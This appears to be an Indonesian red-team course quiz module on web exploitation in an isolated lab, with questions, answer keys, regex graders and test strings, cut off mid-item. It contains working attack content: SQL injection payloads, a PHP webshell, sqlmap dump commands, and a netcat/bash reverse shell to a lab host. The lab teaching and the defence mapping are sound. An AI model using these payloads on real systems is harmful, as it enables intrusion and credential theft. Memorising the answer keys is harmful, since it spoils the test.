---
format: 1
id: rt-web-exploitation
course:
  slug: redteam
  title: Red Team (Lab Pentest)
  description: Sisi ofensif dari DevSecOps — metodologi red team dipelajari di lab terisolasi milik sendiri (VirtualBox host-only, Kali Linux + Metasploitable 2) untuk memahami cara penyerang bekerja dan membangun pertahanannya (purple team). Recon, enumerasi, analisis kerentanan, eksploitasi, post-exploitation, dan pelaporan. SEMUA hanya pada target milik sendiri dengan izin; teknik dipetakan ke kontrol pertahanan di board DevSecOps.
title: Eksploitasi Web (OWASP)
summary: "Sisi penyerang dari board DevSecOps modul 07. Aplikasi web rentan Metasploitable (DVWA, Mutillidae) adalah tempat berlatih kelas OWASP dari sisi red: SQL injection (auth bypass + UNION untuk ekstrak data), OS command injection (eksekusi perintah), file upload (webshell → RCE), serta XSS/CSRF. Plus alat: Burp Suite (proxy manual) & sqlmap (otomasi SQLi). Inti SQLi & command injection dibuktikan di lab penulis; tiap serangan dipetakan ke pertahanan blue (prepared statement, validasi, encoding, WAF)."
order: 6
version: 1
status: verified
updated: '2026-11-26'
tested_on:
  - 'Inti eksploitasi WEB diverifikasi penulis di lab Docker terisolasi (app PHP rentan, sisi penyerang via curl): SQLi auth bypass (user='' OR ''1''=''1 → dump semua user), SQLi UNION (ekstrak password admin), OS command injection (host=127.0.0.1; id → uid=0 root)'
  - 'Spesifik DVWA/Mutillidae, file upload webshell, Burp Suite, dan sqlmap DIDOKUMENTASIKAN untuk dijalankan learner di Metasploitable/Kali (versi app berbeda, tekniknya identik)'
  - Semua pada target milik sendiri di lab terisolasi; tiap serangan dipetakan ke pertahanan board DevSecOps modul 07
objectives:
  - id: sqli
    text: Mengeksploitasi SQL injection (auth bypass, UNION, ekstraksi data)
  - id: cmdinj
    text: Mengeksploitasi OS command injection untuk eksekusi perintah
  - id: upload
    text: Memanfaatkan file upload tak aman menjadi webshell/RCE
  - id: clientside
    text: Memahami XSS & CSRF (serangan sisi klien)
  - id: tools
    text: Memakai Burp Suite & sqlmap untuk serangan web
  - id: purple
    text: Memetakan tiap serangan web ke pertahanannya (blue)
sources:
  - title: OWASP Web Security Testing Guide (WSTG)
    url: https://owasp.org/www-project-web-security-testing-guide/
  - title: OWASP Top 10
    url: https://owasp.org/www-project-top-ten/
  - title: DVWA — Damn Vulnerable Web Application
    url: https://github.com/digininja/DVWA
  - title: sqlmap — automatic SQL injection tool
    url: https://sqlmap.org/
  - title: PortSwigger Web Security Academy (Burp)
    url: https://portswigger.net/web-security
  - title: MITRE ATT&CK — Exploit Public-Facing Application (T1190)
    url: https://attack.mitre.org/techniques/T1190/
questions:
  # ---------------------------------------------------------------- Tier A
  - id: a01
    tier: A
    type: text
    objective: sqli
    prompt: Input `' OR '1'='1` pada form login yang rentan menyebabkan apa, dan kenapa berhasil?
    answers: ['kondisi WHERE selalu benar sehingga query mengembalikan semua baris / login tanpa password — karena input digabung mentah ke SQL (jadi kode)']
    patterns: ['(where|kondisi)[^\n]*(selalu (benar|true)|bypass)', '(semua (baris|user)|login tanpa password|auth bypass)', '(input|data)[^\n]*(gabung|concat|mentah)[^\n]*(sql|kode|query)']
    tests:
      fail: ['tidak ada efek', 'mengenkripsi password', 'mempercepat query', 'memperbaiki database']
    explanation: '`'' OR ''1''=''1` membuat klausa `WHERE name = '''' OR ''1''=''1''` — `''1''=''1''` selalu benar, jadi query mengembalikan **semua baris** (auth bypass / dump). Diverifikasi penulis: payload ini pada `SELECT ... WHERE name = ''$u''` mengembalikan semua user. Berhasil karena input digabung **mentah** ke SQL → data dibaca sebagai **kode** (akar semua injection, board DevSecOps modul 07). DVWA/Mutillidae punya form seperti ini di berbagai tingkat kesulitan. Pertahanan (blue): **prepared statement** — input jadi literal, bukan kode (lab biru modul 07: payload yang sama jadi 0 baris).'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a02
    tier: A
    type: text
    objective: sqli
    prompt: Serangan "UNION-based SQL injection" dipakai untuk apa?
    answers: ['menggabungkan hasil query lain ke output (SELECT ... UNION SELECT) untuk mengekstrak data dari tabel/kolom lain, mis. kredensial']
    patterns: ['union[^\n]*(select)?[^\n]*(gabung|tambah|ekstrak|ambil)[^\n]*(data|kolom|tabel)', '(ekstrak|ambil|curi)[^\n]*(data|kredensial|password)[^\n]*(tabel|kolom) (lain)?', 'menggabungkan[^\n]*(query|hasil)']
    tests:
      fail: ['menghapus tabel', 'mempercepat query', 'mengenkripsi data', 'tidak bisa mengambil data']
    explanation: 'UNION-based SQLi memakai operator SQL `UNION SELECT` untuk **menambahkan hasil query pilihan penyerang** ke output halaman — mengekstrak data dari tabel/kolom lain. Diverifikasi penulis: `'' UNION SELECT name,pass FROM users-- ` mengembalikan **password admin** (`S3cr3tHash!`) ke output. Syaratnya: jumlah & tipe kolom cocok (sering ditemukan dengan `ORDER BY`/`UNION SELECT NULL,NULL...`). Ini mengubah "login bocor" jadi "seluruh database bocor" (data pelanggan, hash password). Pertahanan (blue, board DevSecOps modul 07): prepared statement menutup total; DB user hak-minimal membatasi tabel yang bisa dibaca bila toh lolos.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a03
    tier: A
    type: text
    objective: cmdinj
    prompt: Pada fitur "ping host" yang rentan, input `127.0.0.1; id` menghasilkan apa?
    answers: ['perintah id ikut dieksekusi di server (OS command injection) karena input disisipkan mentah ke shell → eksekusi perintah arbitrer']
    patterns: ['(perintah|command)[^\n]*(id|arbitrer|tambahan)[^\n]*(eksekusi|jalan|dijalankan)', 'command injection|injeksi perintah', '(input|host)[^\n]*(mentah|tak sanitasi)[^\n]*(shell|perintah)']
    tests:
      fail: ['hanya ping biasa', 'error tanpa efek', 'menghapus id', 'mengenkripsi']
    explanation: 'Fitur yang menjalankan `shell_exec("ping $host")` tanpa sanitasi rentan **OS command injection**: `;` memisahkan perintah, jadi `127.0.0.1; id` menjalankan `ping 127.0.0.1` LALU `id`. Diverifikasi penulis: payload `host=127.0.0.1; id` mengembalikan `uid=0(root)` — perintah arbitrer tereksekusi sebagai root. Metakarakter lain: `|`, `&&`, `` ` ``, `$()`. Ini RCE langsung → bisa dilanjut ke reverse shell (`; nc ...`). DVWA punya halaman Command Injection bertingkat. Pertahanan (blue, board DevSecOps modul 07): jangan bangun perintah shell dari input; pakai API berargumen/validasi ketat (allowlist IP), dan jalankan non-root (modul 06) agar dampak terbatas.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a04
    tier: A
    type: text
    objective: upload
    prompt: Mengapa fitur upload file yang menerima `.php` (atau ekstensi eksekusi) sangat berbahaya?
    answers: ['penyerang mengunggah webshell (.php) lalu mengaksesnya via url untuk eksekusi perintah di server (rce)']
    patterns: ['(unggah|upload)[^\n]*(webshell|shell|\.php|skrip)', '(akses|panggil)[^\n]*(url)[^\n]*(eksekusi|jalan|rce)', 'rce|eksekusi (perintah|kode)[^\n]*server']
    tests:
      fail: ['upload file selalu aman', 'php tidak bisa dieksekusi', 'tidak ada risiko', 'hanya memakan disk']
    explanation: 'Jika upload menerima file `.php` (atau `.jsp`/`.aspx`) dan menyimpannya di direktori yang dieksekusi web server, penyerang mengunggah **webshell** (mis. `<?php system($_GET["c"]); ?>`) lalu mengaksesnya: `http://target/uploads/shell.php?c=id` → **RCE**. DVWA punya halaman File Upload bertingkat (dari tanpa cek, sampai cek ekstensi/MIME yang bisa di-bypass). `msfvenom` (modul 05) membuat webshell siap unggah. Pertahanan (blue, board DevSecOps modul 07): validasi tipe (allowlist ekstensi/konten), simpan di luar webroot atau direktori **non-executable**, rename acak, dan jangan percaya ekstensi/MIME dari klien. Upload = jalur RCE klasik.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a05
    tier: A
    type: command
    objective: sqli
    prompt: Otomatiskan deteksi & eksploitasi SQLi pada URL dengan parameter `id` memakai sqlmap.
    answers: ['sqlmap -u "http://192.168.56.101/page?id=1"']
    patterns: ['^sqlmap[ \t].*-u[ \t]+\S*id=', '^sqlmap[ \t].*-u[ \t]+\S+']
    tests:
      pass:
        - 'sqlmap -u "http://192.168.56.101/page?id=1"'
        - 'sqlmap -u http://192.168.56.101/page?id=1 --dbs'
      fail:
        - 'sqlmap 192.168.56.101'
        - 'nmap --script sql 192.168.56.101'
        - 'sqlmap -u'
    explanation: '`sqlmap -u "<url-ber-parameter>"` mendeteksi & mengeksploitasi SQLi otomatis — mencoba berbagai teknik (UNION, boolean/time-based blind, error-based), mengidentifikasi DBMS, lalu bisa dump data. Opsi lanjut: `--dbs` (daftar database), `--tables -D <db>`, `--dump` (ekstrak), `--batch` (non-interaktif), `--risk/--level` (kedalaman). Sangat kuat untuk blind SQLi yang sulit manual. Catatan: berisik & intrusif (banyak request → terdeteksi WAF/log, board DevSecOps modul 09); pakai dalam scope. Untuk form POST: `--data`. sqlmap mengotomasikan apa yang kamu pahami manual (a01/a02) — pahami dulu caranya, baru otomatiskan.'
    source: https://sqlmap.org/

  - id: a06
    tier: A
    type: text
    objective: tools
    prompt: Apa fungsi Burp Suite dalam pengujian keamanan web?
    answers: ['proxy intercept yang menangkap & memodifikasi request/response http antara browser dan server untuk dianalisis/dimanipulasi']
    patterns: ['proxy[^\n]*(intercept|tangkap|request|response)', '(tangkap|intercept|modifikasi|ubah)[^\n]*(request|response|http)', '(antara|between)[^\n]*(browser|klien)[^\n]*(server)']
    tests:
      fail: ['scanner port', 'antivirus', 'kompilator', 'pemutar video']
    explanation: 'Burp Suite adalah **intercepting proxy** — duduk antara browser & server, menangkap tiap request/response HTTP sehingga kamu bisa **memeriksa & memodifikasinya** sebelum dikirim. Inti pengujian web manual: ubah parameter (test IDOR/SQLi), hapus validasi sisi-klien, ganti header/cookie, replay request (Repeater), fuzzing (Intruder). Tanpa proxy, kamu terbatas pada apa yang UI izinkan; dengan Burp, kamu mengontrol request mentah sepenuhnya. Alternatif: OWASP ZAP. Dipakai di DVWA/Mutillidae & web nyata. Sisi blue (board DevSecOps modul 07): inilah kenapa validasi harus server-side — penyerang melewati client dengan proxy seperti Burp.'
    source: https://portswigger.net/web-security

  - id: a07
    tier: A
    type: text
    objective: clientside
    prompt: Apa beda XSS dan SQLi dalam hal "di mana kode jahat dieksekusi"?
    answers: ['xss dieksekusi di browser korban (client-side, mencuri sesi/aksi atas nama korban); sqli dieksekusi di database server (server-side, data)']
    patterns: ['xss[^\n]*(browser|klien|korban|client)', 'sqli[^\n]*(database|server|db)', '(client|browser)[^\n]*(vs|versus|sedangkan)[^\n]*(server|database)']
    tests:
      fail: ['keduanya di server', 'keduanya di browser', 'tidak ada bedanya', 'xss di database']
    explanation: 'Keduanya injection tapi beda lokasi eksekusi: **SQLi** → kode (SQL) dieksekusi di **database server** (dampak: baca/ubah data, server-side). **XSS** → kode (JS/HTML) dieksekusi di **browser korban** (client-side; dampak: curi cookie sesi, aksi atas nama korban, deface). XSS dibuktikan dari sisi blue di board DevSecOps modul 07 (`<script>` dipantulkan mentah). Di DVWA ada halaman XSS Reflected/Stored/DOM. Pertahanan beda: SQLi → prepared statement (server); XSS → output encoding + CSP (browser). Memahami "di mana kode jalan" menentukan dampak & pertahanannya. CSRF beda lagi: menipu browser korban mengirim request yang dikehendaki penyerang.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a08
    tier: A
    type: command
    objective: upload
    prompt: Setelah mengunggah webshell ke `/uploads/shell.php`, jalankan perintah `id` melaluinya dengan curl.
    answers: ['curl "http://192.168.56.101/uploads/shell.php?c=id"']
    patterns: ['^curl[ \t].*uploads/shell\.php\?c=id', '^curl[ \t].*shell\.php\?\S*=id']
    tests:
      pass:
        - 'curl "http://192.168.56.101/uploads/shell.php?c=id"'
        - 'curl http://192.168.56.101/uploads/shell.php?c=id'
      fail:
        - 'curl http://192.168.56.101/uploads/'
        - 'upload shell.php'
        - 'curl http://192.168.56.101/uploads/shell.php'
    explanation: 'Webshell `<?php system($_GET["c"]); ?>` menjalankan apa pun di parameter `c`. Setelah terunggah & bisa diakses, `curl ".../shell.php?c=id"` menjalankan `id` di server dan mengembalikan outputnya — konfirmasi RCE. Lanjut: `?c=whoami`, `?c=cat /etc/passwd`, atau `?c=` reverse shell untuk sesi interaktif (modul 05). Diverifikasi analog penulis: command injection mengembalikan `uid=0(root)`. Ini tahap "confirmed RCE" (modul 04 a13). Sisi blue (board DevSecOps modul 07): validasi upload + direktori non-executable mencegah webshell berjalan; WAF & deteksi (modul 09) menangkap akses webshell (file baru + parameter perintah = IOC).'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a09
    tier: A
    type: text
    objective: sqli
    prompt: Apa itu "blind SQL injection" dan kenapa lebih sulit daripada UNION-based?
    answers: ['data tak langsung tampil di output; penyerang menyimpulkan dari respons true/false atau waktu (time-based) per bit — lambat & butuh otomasi']
    patterns: ['(tidak|tak) (langsung )?(tampil|muncul|terlihat)[^\n]*(output|halaman|hasil)', '(true/false|boolean|time-?based|waktu|respons)[^\n]*(simpul|menebak|infer)', '(lambat|bertahap|per bit|per karakter|otomasi)']
    tests:
      fail: ['blind lebih mudah dari union', 'data langsung tampil', 'tidak butuh teknik khusus', 'sama dengan union']
    explanation: 'Pada **blind SQLi**, hasil query tak ditampilkan langsung di halaman — jadi penyerang tak bisa sekadar UNION. Sebaliknya ia menyimpulkan data secara tak langsung: **boolean-based** (respons berbeda untuk kondisi true vs false — mis. halaman "ada"/"tidak ada") atau **time-based** (`SLEEP(5)` jika kondisi benar → ukur delay). Mengekstrak data dilakukan **per-bit/per-karakter** dengan banyak pertanyaan ya/tidak → sangat lambat, hampir selalu butuh otomasi (**sqlmap**, a05, unggul di sini). Lebih sulit tapi sama berbahaya. Pertahanan sama (prepared statement). Blind SQLi menunjukkan kenapa "tidak ada data yang tampil" tak berarti "tidak rentan".'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a10
    tier: A
    type: text
    objective: clientside
    prompt: Apa dampak paling umum dari XSS yang berhasil terhadap korban yang sedang login?
    answers: ['mencuri cookie/sesi korban atau melakukan aksi atas nama korban (dengan hak korban) di aplikasi']
    patterns: ['(curi|mencuri|ambil)[^\n]*(cookie|sesi|session|token)', '(aksi|tindakan|request)[^\n]*(atas nama|sebagai)[^\n]*korban', '(hak|privilege)[^\n]*korban']
    tests:
      fail: ['memformat hard disk korban', 'tidak ada dampak', 'mematikan server', 'mengenkripsi database']
    explanation: 'XSS berjalan di browser korban dengan hak sesi korban, jadi dampak umum: **mencuri cookie/token sesi** (`document.cookie` → kirim ke penyerang → pembajakan sesi) atau **melakukan aksi atas nama korban** (ubah email, transfer, posting — dengan hak korban, termasuk admin bila korbannya admin). Stored XSS paling berbahaya (mengenai setiap pengunjung halaman). Pertahanan (blue, board DevSecOps modul 07): **output encoding** (akar), **CSP** (lapisan), dan cookie **HttpOnly** (JS tak bisa baca cookie → mitigasi pencurian sesi). Memahami dampak XSS menjelaskan kenapa encoding + HttpOnly penting, bukan sekadar "pop-up alert" yang sering jadi contoh remeh.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a11
    tier: A
    type: command
    objective: sqli
    prompt: Dengan sqlmap, dump daftar database dari URL target yang rentan (parameter id=1).
    answers: ['sqlmap -u "http://192.168.56.101/page?id=1" --dbs']
    patterns: ['^(?=.*--dbs)sqlmap[ \t].*-u[ \t]+\S+']
    tests:
      pass:
        - 'sqlmap -u "http://192.168.56.101/page?id=1" --dbs'
        - 'sqlmap -u http://192.168.56.101/page?id=1 --dbs --batch'
      fail:
        - 'sqlmap -u "http://192.168.56.101/page?id=1"'
        - 'sqlmap --dbs'
        - 'sqlmap -u http://192.168.56.101 --dump'
    explanation: '`--dbs` menyuruh sqlmap mengenumerasi daftar database setelah mengonfirmasi SQLi. Alur ekstraksi bertahap: `--dbs` (daftar DB) → `--tables -D <db>` (tabel) → `--columns -T <tabel> -D <db>` → `--dump -T users -D <db>` (ekstrak baris, mis. kredensial). `--batch` menjawab prompt otomatis. sqlmap menangani teknik rumit (blind, a09) yang melelahkan manual. Ini menunjukkan dampak SQLi secara konkret untuk laporan: "seluruh tabel users (berisi hash password) bisa diekstrak". Sisi blue (board DevSecOps modul 07): prepared statement menutup SQLi total; plus DB user hak-minimal & enkripsi/hash password kuat membatasi nilai data yang bocor.'
    source: https://sqlmap.org/

  - id: a12
    tier: A
    type: text
    objective: tools
    prompt: Mengapa validasi input "sisi klien" (JavaScript di browser) TIDAK bisa diandalkan untuk keamanan?
    answers: ['penyerang melewatinya dengan proxy (burp)/curl yang mengirim request langsung ke server tanpa menjalankan js klien']
    patterns: ['(lewati|bypass|melewati)[^\n]*(proxy|burp|curl|request langsung)', '(kirim|request)[^\n]*(langsung|mentah)[^\n]*server[^\n]*(tanpa (js|validasi klien))?', 'client[^\n]*(bisa diubah|tidak bisa dipercaya)']
    tests:
      fail: ['validasi klien cukup aman', 'penyerang tidak bisa melewatinya', 'js tidak bisa dimatikan', 'client-side paling aman']
    explanation: 'Validasi sisi-klien (JS: cek format, batasi panjang, sembunyikan tombol) hanya untuk **kenyamanan UX** — penyerang melewatinya sepenuhnya dengan **proxy (Burp)** atau **curl**, mengirim request mentah langsung ke server **tanpa menjalankan JS klien**. Diverifikasi sepanjang modul ini: semua serangan dikirim via `curl` langsung ke server. Karena itu keamanan HARUS ditegakkan **server-side** (board DevSecOps modul 07 a05). Ini pelajaran dua-arah: red tahu client-side bisa dilewati (selalu uji request mentah); blue tahu tak boleh pernah percaya apa pun dari klien — validasi & otorisasi di server, selalu.'
    source: https://portswigger.net/web-security

  - id: a13
    tier: A
    type: text
    objective: clientside
    prompt: Apa itu CSRF, dan bedanya dengan XSS?
    answers: ['csrf menipu browser korban yang login untuk mengirim request yang tak dikehendaki (pakai cookie korban); xss menyuntikkan & menjalankan skrip di browser korban']
    patterns: ['csrf[^\n]*(request|aksi)[^\n]*(tak dikehendaki|tak diinginkan|paksa)[^\n]*(cookie|sesi korban)?', 'xss[^\n]*(skrip|script|kode)[^\n]*(browser|korban|jalankan)', '(menipu|paksa)[^\n]*browser korban']
    tests:
      fail: ['csrf dan xss sama', 'csrf menjalankan skrip', 'xss memakai cookie saja', 'tidak ada bedanya']
    explanation: '**CSRF** (Cross-Site Request Forgery) menipu browser korban yang **sedang login** untuk mengirim request yang tak ia kehendaki ke aplikasi (browser otomatis melampirkan cookie sesi) — mis. halaman jahat memicu "ubah email" di bank korban. **XSS** menyuntikkan & **menjalankan skrip** di browser korban. Beda: CSRF memanfaatkan sesi tanpa menjalankan skrip di aplikasi target; XSS mengeksekusi kode di konteks aplikasi. Pertahanan beda (board DevSecOps modul 07): CSRF → anti-CSRF token + `SameSite` cookie; XSS → output encoding + CSP. DVWA/Mutillidae punya latihan keduanya. Sering tertukar — bedakan dengan "siapa yang ditipu & apa yang dijalankan".'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a14
    tier: A
    type: text
    objective: purple
    prompt: SQL injection yang baru kamu eksploitasi — apa pertahanan utama (akar) dari sisi blue?
    answers: ['prepared statement / query ter-parameter — input dikirim terpisah dari query sehingga tak pernah jadi kode sql']
    patterns: ['prepared statement|query ter-?parameter|parameter(ized|isasi)', '(input|data)[^\n]*(terpisah|bukan kode)[^\n]*(query|sql)?', 'placeholder|bind parameter']
    tests:
      fail: ['escape manual saja', 'blacklist tanda kutip', 'validasi panjang saja', 'sembunyikan error']
    explanation: 'Pertahanan akar SQLi = **prepared statement / query ter-parameter** (board DevSecOps modul 07, dibuktikan di lab biru: payload `'' OR ''1''=''1` jadi 0 baris). Input dikirim **terpisah** dari struktur query (placeholder `:name`), jadi database tak pernah mem-parse-nya sebagai kode SQL. Jauh lebih andal dari escaping manual/blacklist (selalu bisa di-bypass). Lapisan tambahan: DB user hak-minimal (batasi dampak), WAF (meredam), jangan bocorkan error SQL. Ini inti purple: kamu baru melihat SQLi berhasil dari sisi red → sekarang kamu tahu persis mengapa prepared statement menutupnya (data tak pernah jadi kode). Serangan memahamkan pertahanan.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: a15
    tier: A
    type: text
    objective: purple
    prompt: Secara umum, akar dari SQLi, command injection, dan XSS adalah sama. Apa itu, dan apa pola pertahanannya?
    answers: ['akar: input tak tepercaya dibaca sebagai kode (campur kode & data); pertahanan: pisahkan kode dari data (parameterize/encode/API berargumen) + validasi']
    patterns: ['(input|data)[^\n]*(tak tepercaya|mentah)[^\n]*(kode|dieksekusi)', '(campur|mencampur)[^\n]*(kode|data)', '(pisah|parameter|encode|api berargumen)[^\n]*(kode|data)']
    tests:
      fail: ['akarnya berbeda semua', 'tidak ada pola umum', 'hanya bisa pakai waf', 'tidak ada pertahanan umum']
    explanation: 'Akar SQLi, OS command injection, dan XSS **sama**: **input tak tepercaya dibaca sebagai kode** (data & kode tercampur) oleh suatu interpreter — SQL engine, shell, atau browser. Pola pertahanannya juga sama (board DevSecOps modul 07): **pisahkan kode dari data** sesuai konteks — prepared statement (SQL), API berargumen bukan shell string (OS command), output encoding (HTML/JS di browser) — ditambah validasi input (allowlist). Inilah wawasan pemersatu board web: begitu kamu melihat "string digabung lalu dikirim ke interpreter", curigai injection, dan tutup dengan memisahkan kode-data. Satu prinsip, banyak manifestasi — di kedua sisi red & blue.'
    source: https://owasp.org/www-project-top-ten/

  # ---------------------------------------------------------------- Tier B
  - id: b01
    tier: B
    type: command
    objective: sqli
    prompt: Temukan jumlah kolom query untuk UNION dengan ORDER BY pada parameter id (coba kolom ke-3).
    answers: ["curl \"http://192.168.56.101/page?id=1 ORDER BY 3--\""]
    patterns: ['^curl[ \t].*id=1[^\n]*(ORDER BY|order by)[^\n]*[0-9]', '^curl[ \t].*(ORDER BY|order by)']
    tests:
      pass:
        - 'curl "http://192.168.56.101/page?id=1 ORDER BY 3--"'
        - 'curl "http://192.168.56.101/page?id=1 order by 3-- -"'
      fail:
        - 'curl "http://192.168.56.101/page?id=1"'
        - 'sqlmap -u http://192.168.56.101/page?id=1'
        - 'curl "http://192.168.56.101/page?id=1 UNION SELECT 1"'
    explanation: 'Sebelum UNION (a02), kamu perlu tahu **berapa kolom** query asli (UNION butuh jumlah kolom cocok). `ORDER BY N--` mengurutkan berdasarkan kolom ke-N: naikkan N sampai error (mis. `ORDER BY 4` error tapi `3` ok → ada 3 kolom). Alternatif: `UNION SELECT NULL,NULL,...--` sampai tak error. Setelah tahu jumlah kolom, susun `UNION SELECT` dengan jumlah kolom sama untuk menaruh data pilihanmu (`UNION SELECT name,pass,NULL FROM users`). Ini teknik manual yang sqlmap otomatiskan. Memahaminya penting untuk SQLi yang sqlmap gagal/diblokir, dan untuk paham apa yang terjadi. (URL-encode spasi di praktik nyata.)'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b02
    tier: B
    type: text
    objective: upload
    prompt: Fitur upload hanya mengecek ekstensi (.php ditolak). Sebutkan satu cara bypass yang umum.
    answers: ['ekstensi alternatif (.phtml/.php5/.phar), double extension (shell.php.jpg), null byte, atau manipulasi content-type/magic bytes']
    patterns: ['\.(phtml|php[0-9]|phar|pht)', 'double extension|shell\.php\.(jpg|png)|ekstensi ganda', 'null byte|content-?type|magic byte|mime']
    tests:
      fail: ['tidak ada cara bypass', 'cek ekstensi selalu aman', 'php tidak punya ekstensi lain', 'upload tidak bisa dibypass']
    explanation: 'Cek ekstensi (blacklist `.php`) sering bisa di-bypass: **ekstensi alternatif** yang tetap dieksekusi web server (`.phtml`, `.php5`, `.phar`, `.pht`), **double extension** (`shell.php.jpg` pada konfigurasi tertentu), **null byte** (`shell.php%00.jpg` di sistem lawas), atau memalsukan **Content-Type/magic bytes** (header file "gambar" tapi isi PHP) untuk melewati cek MIME. DVWA File Upload punya tingkatan yang melatih bypass ini. Pelajaran blue (board DevSecOps modul 07): jangan pakai **blacklist** (selalu ada yang lolos) — pakai **allowlist** ekstensi/konten, verifikasi isi sesungguhnya, simpan di direktori non-executable, dan rename. Blacklist upload = security by blacklist yang rapuh.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b03
    tier: B
    type: command
    objective: cmdinj
    prompt: Dapatkan reverse shell via command injection di parameter host (netcat ke Kali 192.168.56.1 port 4444).
    answers: ['curl "http://192.168.56.101/ping?host=127.0.0.1; nc 192.168.56.1 4444 -e /bin/sh"']
    patterns: ['^curl[ \t].*host=[^\n]*(;|\||&&)[^\n]*(nc|bash|sh)[^\n]*192\.168\.56\.1', '^curl[ \t].*(nc|/bin/sh|bash -i)[^\n]*192\.168']
    tests:
      pass:
        - 'curl "http://192.168.56.101/ping?host=127.0.0.1; nc 192.168.56.1 4444 -e /bin/sh"'
        - 'curl "http://192.168.56.101/ping?host=;bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"'
      fail:
        - 'curl "http://192.168.56.101/ping?host=127.0.0.1"'
        - 'nc -lvnp 4444'
        - 'curl "http://192.168.56.101/ping?host=127.0.0.1; id"'
    explanation: 'Command injection (a03) bisa ditingkatkan dari "jalankan satu perintah" ke **reverse shell interaktif**: sisipkan `; nc <kali> 4444 -e /bin/sh` (atau `bash -i >& /dev/tcp/<kali>/4444 0>&1`) sambil menjalankan listener di Kali (`nc -lvnp 4444`). Target "menelepon pulang" (reverse, modul 05 a06) → kamu dapat shell interaktif, bukan sekadar output satu perintah. Ini jembatan dari kerentanan web ke akses shell penuh (lanjut ke post-ex, modul 08). Sisi blue (board DevSecOps): perbaiki command injection di akar (jangan shell dari input), + **egress deny** (reverse shell tak bisa menelepon pulang, modul 01/08) + deteksi koneksi keluar (modul 09).'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b04
    tier: B
    type: command
    objective: sqli
    prompt: Dump isi tabel `users` dari database `app` dengan sqlmap.
    answers: ['sqlmap -u "http://192.168.56.101/page?id=1" -D app -T users --dump']
    patterns: ['^(?=.*-D[ \t]+\S+)(?=.*-T[ \t]+\S+)(?=.*--dump)sqlmap[ \t]']
    tests:
      pass:
        - 'sqlmap -u "http://192.168.56.101/page?id=1" -D app -T users --dump'
        - 'sqlmap -u "http://192.168.56.101/page?id=1" --dump -D app -T users'
      fail:
        - 'sqlmap -u "http://192.168.56.101/page?id=1" --dbs'
        - 'sqlmap --dump'
        - 'sqlmap -u "http://192.168.56.101/page?id=1"'
    explanation: '`-D <db> -T <tabel> --dump` mengekstrak baris dari tabel spesifik — puncak alur SQLi (`--dbs` → `--tables` → `--columns` → `--dump`). `--dump` pada tabel `users` memberi kredensial (username + hash/password). sqlmap bahkan bisa mencoba crack hash (`--dump` menawarkan dictionary). Ini bukti dampak konkret untuk laporan: "tabel users berisi N kredensial berhasil diekstrak" (modul 10). `--dump-all` untuk seluruh DB. Sisi blue (board DevSecOps): prepared statement mencegah total; bila toh bocor, **hash password kuat (bcrypt/argon2) + salt** membuat kredensial yang diekstrak jauh lebih sulit di-crack — pertahanan berlapis pada data itu sendiri.'
    source: https://sqlmap.org/

  - id: b05
    tier: B
    type: text
    objective: tools
    prompt: Dalam Burp Suite, apa fungsi fitur "Repeater" dan "Intruder"?
    answers: ['repeater: kirim ulang & modifikasi satu request berkali-kali untuk uji manual; intruder: otomatis fuzzing/brute parameter dengan payload (banyak request)']
    patterns: ['repeater[^\n]*(kirim ulang|modifikasi|replay|manual)[^\n]*request', 'intruder[^\n]*(otomat|fuzz|brute|payload|banyak request)', '(uji manual)[^\n]*(otomat|fuzz)?']
    tests:
      fail: ['repeater adalah scanner port', 'intruder mengenkripsi', 'keduanya untuk video', 'tidak ada fungsinya']
    explanation: '**Repeater**: ambil satu request, modifikasi (ubah parameter/header/body), kirim ulang, lihat respons — berulang untuk eksperimen manual (tes payload SQLi/IDOR satu per satu, amati reaksi). **Intruder**: otomasi — tandai posisi payload dalam request, suplai wordlist, Burp mengirim banyak request (fuzzing parameter, brute login, enumerasi) & menandai respons berbeda. Keduanya inti kerja Burp: Repeater untuk presisi manual, Intruder untuk skala. Plus Proxy (intercept, a06), Decoder, Comparer. Untuk SQLi otomatis khusus, sqlmap sering lebih kuat; Burp unggul untuk logika aplikasi & serangan yang butuh konteks. Sisi blue: aktivitas Intruder = banyak request = terdeteksi (board DevSecOps modul 08/09 — rate limit, deteksi).'
    source: https://portswigger.net/web-security

  - id: b06
    tier: B
    type: text
    objective: clientside
    prompt: Apa beda Stored XSS, Reflected XSS, dan DOM-based XSS?
    answers: ['stored: payload tersimpan di server & tampil ke banyak korban; reflected: payload di request langsung dipantulkan ke response; dom: js klien menulis input ke dom tanpa encoding']
    patterns: ['stored[^\n]*(tersimpan|disimpan|server|banyak korban|persisten)', 'reflected[^\n]*(request|dipantulkan|langsung)', 'dom[^\n]*(js|javascript|klien|client)[^\n]*(dom|menulis)']
    tests:
      fail: ['ketiganya sama', 'stored hanya mengenai satu korban', 'reflected tersimpan permanen', 'dom di server']
    explanation: 'Tiga tipe XSS: **Stored/persistent** — payload **tersimpan** di server (DB/komentar) lalu tampil ke **setiap** pengunjung halaman (paling berbahaya, mengenai banyak korban). **Reflected** — payload di request (URL/form) langsung **dipantulkan** ke response (butuh korban mengeklik link jahat; diverifikasi dari sisi blue di board DevSecOps modul 07). **DOM-based** — JS di **klien** menulis input ke DOM (`innerHTML`) tanpa encoding, tak melibatkan server. DVWA punya ketiganya. Pertahanan dasar sama (output encoding kontekstual + CSP), tapi DOM-based butuh perhatian di kode JS klien juga. Memahami tipe menentukan di mana payload dissuntik & siapa korbannya.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b07
    tier: B
    type: text
    objective: sqli
    prompt: Lewat SQLi di MySQL, teknik apa yang kadang bisa menulis file ke server (menuju RCE)?
    answers: ['INTO OUTFILE/DUMPFILE untuk menulis webshell ke direktori web (bila FILE privilege & secure_file_priv mengizinkan)']
